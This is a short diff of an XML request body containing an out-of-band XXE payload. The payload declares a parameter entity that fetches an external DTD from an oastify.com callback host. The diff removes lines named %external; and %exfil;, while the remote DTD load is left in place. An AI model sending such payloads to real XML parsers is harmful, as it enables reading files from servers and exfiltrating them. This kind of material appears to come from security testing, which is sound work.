@@ -2,8 +2,6 @@
 <!DOCTYPE oob [
 <!ENTITY % base SYSTEM "http://rvqbo4unzcvxkhnylypjldhyhpngb73vs.oastify.com/external.dtd"> 
 %base;
-%external;
-%exfil;
 ]>
 <app>
      <id>gj8dl19d0</id>
